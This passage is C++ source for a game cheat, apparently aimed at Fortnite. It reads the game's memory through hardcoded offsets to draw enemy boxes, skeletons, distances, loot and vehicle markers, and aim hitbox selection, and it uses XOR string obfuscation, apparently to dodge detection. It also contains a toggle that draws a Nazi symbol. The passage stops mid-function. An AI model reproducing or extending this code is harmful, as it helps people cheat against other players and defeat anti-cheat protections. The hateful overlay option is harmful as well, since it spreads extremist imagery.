	auto wz2 = rotation[3] * z2;
	out[1][0] = (xy2 - wz2) * scale[1];
	out[0][1] = (xy2 + wz2) * scale[0];

	auto xz2 = rotation[0] * z2;
	auto wy2 = rotation[3] * y2;
	out[2][0] = (xz2 + wy2) * scale[2];
	out[0][2] = (xz2 - wy2) * scale[0];

	out[0][3] = 0.0f;
	out[1][3] = 0.0f;
	out[2][3] = 0.0f;
	out[3][3] = 1.0f;
}

VOID MultiplyMatrices(float a[4][4], float b[4][4], float out[4][4]) {
	for (auto r = 0; r < 4; ++r) {
		for (auto c = 0; c < 4; ++c) {
			auto sum = 0.0f;

			for (auto i = 0; i < 4; ++i) {
				sum += a[r][i] * b[i][c];
			}

			out[r][c] = sum;
		}
	}
}

VOID GetBoneLocation(float compMatrix[4][4], PVOID bones, DWORD index, float out[3]) {
	float boneMatrix[4][4];
	ToMatrixWithScale((float*)((PBYTE)bones + (index * 0x30)), boneMatrix);

	float result[4][4];
	MultiplyMatrices(boneMatrix, compMatrix, result);

	out[0] = result[3][0];
	out[1] = result[3][1];
	out[2] = result[3][2];
}


bool isVis;

bool isVisible(DWORD_PTR mesh)
{
	if (!mesh)
		return false;
	float fLastSubmitTime = read<float>(mesh + 0x330);
	float fLastRenderTimeOnScreen = read<float>(mesh + 0x338);

	const float fVisionTick = 0.06f;
	bool bVisible = fLastRenderTimeOnScreen + fVisionTick >= fLastSubmitTime;
	return bVisible;
}


#define BONE_HEAD_ID (68)
#define BONE_NECK_ID (66)
#define BONE_CHEST_ID (6)
#define BONE_PELVIS_ID (2)
#define PI (3.141592653589793f)

void Init() {

	//auto funcName = GetObjectFirstName(func);

	if (fovCircle)
	{
		ImGui::GetOverlayDrawList()->AddCircle(ImVec2(Width / 2, Height / 2), FovSize, ImColor(225, 225, 225, 225), 0, 1.0f);
	}

	if (square) {

		ImGui::GetOverlayDrawList()->AddRect(ImVec2(ScreenCenterX - FovSize, ScreenCenterY - FovSize), ImVec2(ScreenCenterX + FovSize, ScreenCenterY + FovSize), ImColor(128, 224, 0, 200), 0, 2, 1.f);
	}

	if (Filledfov)
	{
		ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Width / 2, Height / 2), FovSize, ImColor(0, 0, 0, 180), 300);
	}

	if (crosshair)
	{
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 - 7, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImColor(255, 0, 0, 255), 1.0);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 + 8, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImColor(255, 0, 0, 255), 1.0);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 - 7), ImVec2(Width / 2, Height / 2), ImColor(255, 0, 0, 255), 1.0);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 + 8), ImVec2(Width / 2, Height / 2), ImColor(255, 0, 0, 255), 1.0);
	}

	if (heilhitler)
	{
		DrawCrossNazi(10, ImColor(255, 0, 0, 255));
	}

	if (hitboxpos == 0)
	{
		hitbox = BONE_HEAD_ID; //head
	}
	else if (hitboxpos == 1)
	{
		hitbox = BONE_NECK_ID; //neck
	}
	else if (hitboxpos == 2)
	{
		hitbox = BONE_CHEST_ID; //chest
	}
	else if (hitboxpos == 3)
	{
		hitbox = BONE_PELVIS_ID; //pelvis
	}

	auto entityListCopy = entityList;
	float closestDistance = FLT_MAX;
	DWORD_PTR closestPawn = NULL;
	Uworld = read<DWORD_PTR>(base_address + OFFSET_UWORLD);
	DWORD_PTR Gameinstance = read<DWORD_PTR>(Uworld + OFFSETS::Gameinstance);
	DWORD_PTR LocalPlayers = read<DWORD_PTR>(Gameinstance + OFFSETS::LocalPlayers);
	Localplayer = read<DWORD_PTR>(LocalPlayers);
	PlayerController = read<DWORD_PTR>(Localplayer + OFFSETS::PlayerController);
	LocalPawn = read<DWORD_PTR>(PlayerController + OFFSETS::LocalPawn);
	PlayerState = read<DWORD_PTR>(LocalPawn + OFFSETS::PlayerState);
	DWORD_PTR PlayerCameraManager = read<DWORD_PTR>(PlayerController + 0x340);
	PlayerCamManager = read<DWORD_PTR>(LocalPawn + PlayerCameraManager);
	Rootcomp = read<DWORD_PTR>(LocalPawn + OFFSETS::RootComponet);
	Persistentlevel = read<DWORD_PTR>(Uworld + OFFSETS::PersistentLevel);
	DWORD ActorCount = read<DWORD>(Persistentlevel + OFFSETS::ActorCount);
	DWORD_PTR AActors = read<DWORD_PTR>(Persistentlevel + OFFSETS::AActor);
	DWORD_PTR GameState = read<DWORD_PTR>(Uworld + 0x148);//gamestate
	DWORD_PTR PlayerArray = read<DWORD_PTR>(GameState + OFFSETS::PlayerArray);//playerarray
	bool InLobby;
	InLobby = false;
	if (!LocalPawn) {
		InLobby = true;
	}

	for (LootEntity LEntityList : LootentityList) {

		if (LocalPawn)
		{
			uintptr_t ItemRootComponent = read<uintptr_t>(LEntityList.ACurrentItem + 0x190);
			Vector3 ItemPosition = read<Vector3>(ItemRootComponent + 0x128);
			float ItemDist = localactorpos.Distance(ItemPosition) / 100.f;
			std::string null = ("");
			auto IsSearched = read<BYTE>((uintptr_t)LEntityList.ACurrentItem + 0xfb9);
			if (IsSearched >> 7 & 1) continue;
			Vector3 ChestPosition;
			ChestPosition = W2S(ItemPosition);
			Vector3 VehiclePosition = W2S(ItemPosition);

			if (world_chests)
			{
				if (strstr(LEntityList.GNames.c_str(), ("Tiered_Chest")) && world_chests)
				{
					if (ItemDist < WorldEspDistance)
					{
						Vector3 ChestPosition;
						ChestPosition = W2S(ItemPosition);
						std::string Text = null + ("Chest [") + std::to_string((int)ItemDist) + ("m]");
						DrawString(14, ChestPosition.x, ChestPosition.y, &Col.orange_, true, true, Text.c_str());
					}
				}
			}
			else if (world_supplydrop && strstr(LEntityList.GNames.c_str(), ("AthenaSupplyDrop_C")))
			{
				if (ItemDist < WorldEspDistance) {
					Vector3 ChestPosition;
					ChestPosition = W2S(ItemPosition);

					std::string Text = null + ("Supply Drop [") + std::to_string((int)ItemDist) + ("m]");
					DrawString(14, ChestPosition.x, ChestPosition.y, &Col.blue, true, true, Text.c_str());

				}
			}
			else if (world_ammo && strstr(LEntityList.GNames.c_str(), ("Tiered_Ammo")))
			{
				if (ItemDist < WorldEspDistance) {
					Vector3 ChestPosition;
					ChestPosition = W2S(ItemPosition);
					std::string Text = null + ("Ammo Box [") + std::to_string((int)ItemDist) + ("m]");
					DrawString(14, ChestPosition.x, ChestPosition.y, &Col.white, true, true, Text.c_str());

				}
			}
			//NPC_Pawn_Irwin_Predator_Robert_C   NPC_Pawn_Irwin_Prey_Burt_C				NPC_Pawn_Irwin_Simple_Smackie_C			NPC_Pawn_Irwin_Predator_Grandma_C			NPC_Pawn_Irwin_Simple_Avian_Crow_C
			else if ((world_animal && (strstr(LEntityList.GNames.c_str(), ("NPC_Pawn_Irwin_Predator_Robert_C"))) || (strstr(LEntityList.GNames.c_str(), ("NPC_Pawn_Irwin_Prey_Burt_C"))) || (strstr(LEntityList.GNames.c_str(), ("NPC_Pawn_Irwin_Simple_Smackie_C"))) || (strstr(LEntityList.GNames.c_str(), ("NPC_Pawn_Irwin_Prey_Nug_C"))) || (strstr(LEntityList.GNames.c_str(), ("NPC_Pawn_Irwin_Predator_Grandma_C"))))) {
				if (ItemDist < WorldEspDistance) {
					std::string Text = null + ("Animal [") + std::to_string((int)ItemDist) + ("m]");
					DrawString(14, VehiclePosition.x, VehiclePosition.y, &Col.white, true, true, Text.c_str());
				}
			}
			else if ((world_boat && (strstr(LEntityList.GNames.c_str(), ("MeatballVehicle_L_C")))))
			{
				if (ItemDist < WorldEspDistance) {
					Vector3 VehiclePosition = W2S(ItemPosition);
					std::string Text = null + ("Boat [") + std::to_string((int)ItemDist) + ("m]");
					DrawString(14, VehiclePosition.x, VehiclePosition.y, &Col.white, true, true, Text.c_str());
				}
			}
			else if ((world_car && (strstr(LEntityList.GNames.c_str(), ("Vehicl")) || strstr(LEntityList.GNames.c_str(), ("Valet_Taxi")) || strstr(LEntityList.GNames.c_str(), ("Valet_BigRig")) || strstr(LEntityList.GNames.c_str(), ("Valet_BasicTr")) || strstr(LEntityList.GNames.c_str(), ("Valet_SportsC")) || strstr(LEntityList.GNames.c_str(), ("Valet_BasicC")))))
			{
				if (ItemDist < WorldEspDistance) {
					Vector3 VehiclePosition = W2S(ItemPosition);
					std::string Text = null + ("Vehicle [") + std::to_string((int)ItemDist) + ("m]");
					DrawString(14, VehiclePosition.x, VehiclePosition.y, &Col.red, true, true, Text.c_str());
				}
			}
			else if (world_weapon && strstr(LEntityList.GNames.c_str(), ("FortPickupAthena")) || strstr(LEntityList.GNames.c_str(), ("Fort_Pickup_Creative_C")))
			{
				if (ItemDist < WorldEspDistance) {

					auto definition = read<uint64_t>(LEntityList.ACurrentItem + 0x2f8 + 0x18);
					BYTE tier = read<BYTE>(definition + 0x70);

					RGBA Color, RGBAColor;
					Vector3 ChestPosition = W2S(ItemPosition);

					auto DisplayName = read<uint64_t>(definition + 0x90);
					auto WeaponLength = read<uint32_t>(DisplayName + 0x38);
					wchar_t* WeaponName = new wchar_t[uint64_t(WeaponLength) + 1];

					std::string Text = wchar_to_char(WeaponName);
					std::string wtf2 = Text + (" [ ") + std::to_string((int)ItemDist) + ("M ]");
					if (tier == 2 && (uncommon))
					{
						Color = Col.darkgreen;
					}
					else if ((tier == 3) && (rare))
					{
						Color = Col.blue;
					}
					else if ((tier == 4) && (epic))
					{
						Color = Col.purple;
					}
					else if ((tier == 5) && (legendary))
					{
						Color = Col.orange;
					}
					else if ((tier == 6) && (mythic))
					{
						Color = Col.yellow;
					}
					else if ((tier == 0) || (tier == 1) && (common))
					{
						Color = Col.gray;
					}

					DrawString(14, ChestPosition.x, ChestPosition.y, &Color, true, true, wtf2.c_str());

				}
			}
		}
	}

	for (int i = 0; i < VisDist; i++)
	{
		auto player = read<uintptr_t>(PlayerArray + i * 0x8);
		auto CurrentActor = read<uintptr_t>(player + 0x300);//PawnPrivate

		if (!CurrentActor) { continue; }

		int MyTeamId = read<int>(OFFSETS::PlayerState + 0x10e8);
		DWORD64 otherPlayerState = read<uint64_t>(CurrentActor + OFFSETS::PlayerState);
		uintptr_t currentgun = read<uintptr_t>(LocalPawn + 0x868);
		auto bIsReloadingWeapon = read<bool>(currentgun + 0x329);
		uint64_t CurrentActorMesh = read<uint64_t>(CurrentActor + OFFSETS::Mesh);
		int ActorTeamId = read<int>(otherPlayerState + OFFSETS::TeamId);

		auto entityListCopy = entityList;
		if (MyTeamId == ActorTeamId) continue;
		int LocalTeam;
		if (CurrentActor == LocalPawn) continue;
		Vector3 Headpos = GetBoneWithRotation(CurrentActorMesh, 68);
		localactorpos = read<Vector3>(Rootcomp + 0x128);
		auto normal_head = W2S(Headpos);
		float distance = localactorpos.Distance(Headpos) / 80.f;
		float ranged = localactorpos.Distance(Headpos) / 10.f;

		Vector3 bone0 = GetBoneWithRotation(CurrentActorMesh, 0);
		Vector3 bottom = W2S(bone0);
		Vector3 Headbox = W2S(Vector3(Headpos.x, Headpos.y, Headpos.z + 15));
		Vector3 w2shead = W2S(Headpos);

		uint64_t LocalPlayerState = read<uint64_t>(LocalPawn + 0x2B8);
		LocalTeam = read<int>(LocalPlayerState + 0x1068);

		float BoxHeight = (float)(Headbox.y - bottom.y);
		float BoxWidth = BoxHeight * BoxWidthValue;

		float LeftX = (float)Headbox.x - (BoxWidth / 1);
		float LeftY = (float)bottom.y;

		float CornerHeight = abs(Headbox.y - bottom.y);
		float CornerWidth = CornerHeight * BoxWidthValue;

		auto isDBNO = (read<uintptr_t>(CurrentActor + OFFSETS::IsDBNO));
		auto isDying = (read<uintptr_t>(CurrentActor + OFFSETS::Dying));

	    // MyTeamId != otherPlayerState || !isDying
		//  || !isDBNO

		if (vischeck || Esp || distance < VisDist) {

			ImU32 ColorMESH; RGBA ColorMESHRGBA;
			if (isVisible(CurrentActorMesh)) {
				ColorMESH = { ImColor(128,224,0,255) }; ColorMESHRGBA = { 128,224,0,255 };
			}
			else if (isVisible(CurrentActorMesh)) {
				ColorMESH = { ImColor(255,0,0,255) }; ColorMESHRGBA = { 255,0,0,255 };
			}

			if (ThreeDBox) {
				Vector3 vHeadBone = GetBoneWithRotation(CurrentActorMesh, 68);
				Vector3 vRootBone = GetBoneWithRotation(CurrentActorMesh, 0);
				Vector3 vHeadBoneOut = W2S(Vector3(vHeadBone.x, vHeadBone.y, vHeadBone.z + 15));
				Vector3 vRootBoneOut = W2S(vRootBone);

				if (vHeadBoneOut.x != 0 || vHeadBoneOut.y != 0 || vHeadBoneOut.z != 0)
				{

					Vector3 bottom1 = W2S(Vector3(vRootBone.x + 40, vRootBone.y - 40, vRootBone.z));
					Vector3 bottom2 = W2S(Vector3(vRootBone.x - 40, vRootBone.y - 40, vRootBone.z));
					Vector3 bottom3 = W2S(Vector3(vRootBone.x - 40, vRootBone.y + 40, vRootBone.z));
					Vector3 bottom4 = W2S(Vector3(vRootBone.x + 40, vRootBone.y + 40, vRootBone.z));

					Vector3 top1 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y - 40, vHeadBone.z + 15));
					Vector3 top2 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y - 40, vHeadBone.z + 15));
					Vector3 top3 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y + 40, vHeadBone.z + 15));
					Vector3 top4 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y + 40, vHeadBone.z + 15));

					if (isVisible(CurrentActorMesh)) {
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), IM_COL32(0, 255, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), IM_COL32(0, 255, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), IM_COL32(0, 255, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), IM_COL32(0, 255, 0, 255), 0.1f);

						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), IM_COL32(0, 255, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), IM_COL32(0, 255, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), IM_COL32(0, 255, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), IM_COL32(0, 255, 0, 255), 0.1f);

						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), IM_COL32(0, 255, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), IM_COL32(0, 255, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), IM_COL32(0, 255, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), IM_COL32(0, 255, 0, 255), 0.1f);
					}
					else if (!isVisible(CurrentActorMesh)) {

						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), IM_COL32(255, 0, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), IM_COL32(255, 0, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), IM_COL32(255, 0, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), IM_COL32(255, 0, 0, 255), 0.1f);

						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), IM_COL32(255, 0, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), IM_COL32(255, 0, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), IM_COL32(255, 0, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), IM_COL32(255, 0, 0, 255), 0.1f);

						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), IM_COL32(255, 0, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), IM_COL32(255, 0, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), IM_COL32(255, 0, 0, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), IM_COL32(255, 0, 0, 255), 0.1f);
					}

					if (Esp_Distance) {
						XorS(dst, "[%.fm]\n");
						char dist[64];
						sprintf_s(dist, dst.decrypt(), distance);
						DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 25), 17.0f, IM_COL32(255, 255, 255, 255), true);
					}
				}
			}

			if (reloadCheck)
			{
				if (isVisible(CurrentActorMesh)) {
					if (bIsReloadingWeapon)
						ImGui::GetOverlayDrawList()->AddText(ImVec2(Headbox.x, Headbox.y + 20), IM_COL32(255, 255, 255, 255), "PLAYER RELOADING");
				}
				else if (!isVisible(CurrentActorMesh)) {
					if (bIsReloadingWeapon)
						ImGui::GetOverlayDrawList()->AddText(ImVec2(Headbox.x, Headbox.y + 20), IM_COL32(255, 255, 255, 255), "PLAYER RELOADING");
				}
			}

			if (DrawEnemyFov)
			{
				ImU32 FovVisCheck;
				if (isVisible(CurrentActorMesh)) {
					FovVisCheck = ImGui::GetColorU32({ 255, 255, 255, 255 });
				}
				else if (!isVisible(CurrentActorMesh)) {
					FovVisCheck = ImGui::GetColorU32({ 255,0,0,255 });
				}

				VisualSize = !distance;

				Vector3 HitBox = GetBoneWithRotation(CurrentActorMesh, hitbox);
				Vector3 HitBoxPos = W2S(Vector3(HitBox.x, HitBox.y, HitBox.z));

				ImGui::GetOverlayDrawList()->AddCircle(ImVec2(HitBoxPos.x, HitBoxPos.y), VisualSize, FovVisCheck, 200, 1.0f);
			}

			if (playerbot)
			{
				if (isVisible(CurrentActorMesh)) {
					auto fname = GetNameFromFName(CurrentActorId);
					if (strstr(fname.c_str(), ("PlayerPawn_Athena_C")) || strstr(fname.c_str(), ("PlayerPawn_Athena_Phoebe_C")) || strstr(fname.c_str(), ("BP_MangPlayerPawn")))
						DrawString(15, Headbox.x, Headbox.y, &Col.white, true, true, ("BOT"));
					else
						DrawString(15, Headbox.x, Headbox.y, &Col.white, true, true, ("PLAYER"));
				}
				else if (!isVisible(CurrentActorMesh)) {
					auto fname = GetNameFromFName(CurrentActorId);
					if (strstr(fname.c_str(), ("PlayerPawn_Athena_C")) || strstr(fname.c_str(), ("PlayerPawn_Athena_Phoebe_C")) || strstr(fname.c_str(), ("BP_MangPlayerPawn")))
						DrawString(15, Headbox.x, Headbox.y, &Col.red, true, true, ("BOT"));
					else
						DrawString(15, Headbox.x, Headbox.y, &Col.red, true, true, ("PLAYER"));
				}
			}

			if (fillbox)
			{
				DrawFilledRect(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, &Col.FiledBox);
			}

			if (Esp_box)
			{
				if (isVisible(CurrentActorMesh))
				{
					// rgba(0, 255, 231, 0)
					DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(128, 224, 0, 255), 2.5f);

					if (Esp_Distance) {
						XorS(dst, "[%.fm]\n");
						char dist[64];
						sprintf_s(dist, dst.decrypt(), distance);
						DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 255, 255, 255), true);
					}
				}
				else if (!isVisible(CurrentActorMesh)) {
					// rgba(0, 255, 231, 1)
					DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(255, 0, 0, 255), 2.5f);

					if (Esp_Distance) {
						XorS(dst, "[%.fm]\n");
						char dist[64];
						sprintf_s(dist, dst.decrypt(), distance);
						DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 0, 0, 255), true);
					}
				}
			}

			if (Esp_fbox)
			{
				if (isVisible(CurrentActorMesh))
				{
					DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, 1.5f, IM_COL32(128, 224, 0, 255));

					if (Esp_Distance) {
						XorS(dst, "[%.fm]\n");
						char dist[64];
						sprintf_s(dist, dst.decrypt(), distance);
						DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 255, 255, 255), true);
					}
				}
				else if (!isVisible(CurrentActorMesh)) {
					DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, 1.5f, IM_COL32(255, 0, 0, 255));

					if (Esp_Distance) {
						XorS(dst, "[%.fm]\n");
						char dist[64];
						sprintf_s(dist, dst.decrypt(), distance);
						DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 0, 0, 255), true);
					}
				}
			}


			if (Esp_line)
			{
				Vector3 vHeadBone = GetBoneWithRotation(CurrentActorMesh, hitbox);
				Vector3 vHeadBoneOut = W2S(vHeadBone);

				if (isVisible(CurrentActorMesh))
				{
					DrawLine(Width / 2 - 0, Height, vHeadBoneOut.x, vHeadBoneOut.y, &Col.green, 0.5f);
				}
				else if (!isVisible(CurrentActorMesh)) {
					DrawLine(Width / 2 - 0, Height, vHeadBoneOut.x, vHeadBoneOut.y, &Col.red, 0.5f);
				}
			}

			if (Esp_Skeleton)
			{
				Vector3 vHeadBone = GetBoneWithRotation(CurrentActorMesh, 68);
				Vector3 vHip = GetBoneWithRotation(CurrentActorMesh, 2);
				Vector3 vNeck = GetBoneWithRotation(CurrentActorMesh, 67);
				Vector3 vUpperArmLeft = GetBoneWithRotation(CurrentActorMesh, 9);
				Vector3 vUpperArmRight = GetBoneWithRotation(CurrentActorMesh, 38);
				Vector3 vLeftHand = GetBoneWithRotation(CurrentActorMesh, 10);
				Vector3 vRightHand = GetBoneWithRotation(CurrentActorMesh, 39);
				Vector3 vLeftHand1 = GetBoneWithRotation(CurrentActorMesh, 30);
				Vector3 vRightHand1 = GetBoneWithRotation(CurrentActorMesh, 59);
				Vector3 vRightThigh = GetBoneWithRotation(CurrentActorMesh, 78);
				Vector3 vLeftThigh = GetBoneWithRotation(CurrentActorMesh, 71);
				Vector3 vRightCalf = GetBoneWithRotation(CurrentActorMesh, 79);
				Vector3 vLeftCalf = GetBoneWithRotation(CurrentActorMesh, 72);
				Vector3 vLeftFoot = GetBoneWithRotation(CurrentActorMesh, 73);
				Vector3 vRightFoot = GetBoneWithRotation(CurrentActorMesh, 80);
				Vector3 vPelvisOut = GetBoneWithRotation(CurrentActorMesh, 8);
				Vector3 vHeadBoneOut = W2S(vHeadBone);
				Vector3 vPelvis = W2S(vPelvisOut);
				Vector3 vHipOut = W2S(vHip);
				Vector3 vNeckOut = W2S(vNeck);
				Vector3 vUpperArmLeftOut = W2S(vUpperArmLeft);
				Vector3 vUpperArmRightOut = W2S(vUpperArmRight);
				Vector3 vLeftHandOut = W2S(vLeftHand);
				Vector3 vRightHandOut = W2S(vRightHand);
				Vector3 vLeftHandOut1 = W2S(vLeftHand1);
				Vector3 vRightHandOut1 = W2S(vRightHand1);
				Vector3 vRightThighOut = W2S(vRightThigh);
				Vector3 vLeftThighOut = W2S(vLeftThigh);
				Vector3 vRightCalfOut = W2S(vRightCalf);
				Vector3 vLeftCalfOut = W2S(vLeftCalf);
				Vector3 vLeftFootOut = W2S(vLeftFoot);
				Vector3 vRightFootOut = W2S(vRightFoot);

				DrawLine(vHeadBoneOut.x, vHeadBoneOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
				DrawLine(vHipOut.x, vHipOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
				DrawLine(vUpperArmLeftOut.x, vUpperArmLeftOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
				DrawLine(vUpperArmRightOut.x, vUpperArmRightOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
				DrawLine(vLeftHandOut.x, vLeftHandOut.y, vUpperArmLeftOut.x, vUpperArmLeftOut.y, &Col.white, 0.6f);
				DrawLine(vRightHandOut.x, vRightHandOut.y, vUpperArmRightOut.x, vUpperArmRightOut.y, &Col.white, 0.6f);
				DrawLine(vLeftHandOut.x, vLeftHandOut.y, vLeftHandOut1.x, vLeftHandOut1.y, &Col.white, 0.6f);
				DrawLine(vRightHandOut.x, vRightHandOut.y, vRightHandOut1.x, vRightHandOut1.y, &Col.white, 0.6f);
				DrawLine(vLeftThighOut.x, vLeftThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
				DrawLine(vRightThighOut.x, vRightThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
				DrawLine(vLeftCalfOut.x, vLeftCalfOut.y, vLeftThighOut.x, vLeftThighOut.y, &Col.white, 0.6f);
				DrawLine(vRightCalfOut.x, vRightCalfOut.y, vRightThighOut.x, vRightThighOut.y, &Col.white, 0.6f);
				DrawLine(vLeftFootOut.x, vLeftFootOut.y, vLeftCalfOut.x, vLeftCalfOut.y, &Col.white, 0.6f);
				DrawLine(vRightFootOut.x, vRightFootOut.y, vRightCalfOut.x, vRightCalfOut.y, &Col.white, 0.6f);

				if (penis)
				{
					auto penis = W2S({ vPelvis.x, vPelvis.y, vPelvis.z + 3 });
					DrawLine(vPelvis.x, vPelvis.y, penis.x, penis.y, &Col.white, 1.f);
				}

				if (unicorn)
				{
					auto head = W2S({ vHeadBone.x, vHeadBone.y, vHeadBone.z + 3 });
					DrawLine(vHeadBone.x, vHeadBone.y, head.x, head.y, &Col.Magenta, 1.f);
				}

			}

		}
		else {

			if (distance < VisDist || Esp || !isDBNO)
			{

				if (DrawEnemyFov)
				{
					ImU32 FovVisCheck;
					bool TooClose = false;
					float ranged = localactorpos.Distance(Headpos) / 10.f;
					if (isVisible(CurrentActorMesh)) { FovVisCheck = ImGui::GetColorU32({ 255, 255, 255, 255 }); }
					else if (!isVisible(CurrentActorMesh)) { FovVisCheck = ImGui::GetColorU32({ 255,0,0,255 }); }

					if (ranged) { VisualSize = distance; }
					else if (!ranged) { VisualSize = !distance; }

					Vector3 HitBox = GetBoneWithRotation(CurrentActorMesh, hitbox);
					Vector3 HitBoxPos = W2S(Vector3(HitBox.x, HitBox.y, HitBox.z));
					ImGui::GetOverlayDrawList()->AddCircle(ImVec2(HitBoxPos.x, HitBoxPos.y), VisualSize, FovVisCheck, 200, 1.0f);
				}

				if (ThreeDBox) {

					Vector3 vHeadBone = GetBoneWithRotation(CurrentActorMesh, 68);
					Vector3 vRootBone = GetBoneWithRotation(CurrentActorMesh, 0);
					Vector3 vHeadBoneOut = W2S(Vector3(vHeadBone.x, vHeadBone.y, vHeadBone.z + 15));
					Vector3 vRootBoneOut = W2S(vRootBone);

					if (vHeadBoneOut.x != 0 || vHeadBoneOut.y != 0 || vHeadBoneOut.z != 0)
					{

						Vector3 bottom1 = W2S(Vector3(vRootBone.x + 40, vRootBone.y - 40, vRootBone.z));
						Vector3 bottom2 = W2S(Vector3(vRootBone.x - 40, vRootBone.y - 40, vRootBone.z));
						Vector3 bottom3 = W2S(Vector3(vRootBone.x - 40, vRootBone.y + 40, vRootBone.z));
						Vector3 bottom4 = W2S(Vector3(vRootBone.x + 40, vRootBone.y + 40, vRootBone.z));

						Vector3 top1 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y - 40, vHeadBone.z + 15));
						Vector3 top2 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y - 40, vHeadBone.z + 15));
						Vector3 top3 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y + 40, vHeadBone.z + 15));
						Vector3 top4 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y + 40, vHeadBone.z + 15));

						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), IM_COL32(144, 0, 255, 255), 0.1f);

